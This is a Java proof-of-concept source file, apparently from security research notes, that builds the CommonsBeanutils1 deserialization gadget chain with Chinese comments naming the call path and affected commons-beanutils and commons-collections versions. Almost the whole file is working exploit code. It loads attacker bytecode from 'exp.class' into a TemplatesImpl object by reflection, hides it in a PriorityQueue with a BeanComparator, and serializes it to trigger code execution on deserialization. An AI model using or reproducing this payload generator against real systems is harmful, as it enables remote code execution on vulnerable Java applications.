import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import static util.Util.serialize;
import static util.Util.unserialize;

/*PriorityQueue.readObject()->heapify()->siftDown()->siftDownUsingComparator()
    BeanComparator.compare()
            PropertyUtils.getProperty()
                PropertyUtilsBean.getProperty()->getNestedProperty()->动态调用TemplatesImpl.getOutputProperties()
                    TemplatesImpl.getOutputProperties()->newTransformer()->getTransletInstance()

                        */
/*版本依赖:
* commons-beanutils : 1.9.2
commons-collections : 2.0-3.2.2*/
/*注:BeanComparator使用的是默认的Compare，即为ComparableComparator，这个Compare位于CC中。*/
public class CommonBeanutils1_ComparableComparator {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        PriorityQueue priorityQueue=new PriorityQueue(2);
        priorityQueue.add("1");
        priorityQueue.add("2");
        Field field=PriorityQueue.class.getDeclaredField("queue");
        field.setAccessible(true);
        Object[] objects = (Object[]) field.get(priorityQueue);
        objects[0] = templates;
        BeanComparator beanComparator=new BeanComparator("outputProperties");
        Field field1 =Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field1.setAccessible(true);
        field1.set(priorityQueue,beanComparator);
        serialize(priorityQueue);
        unserialize();
    }
}
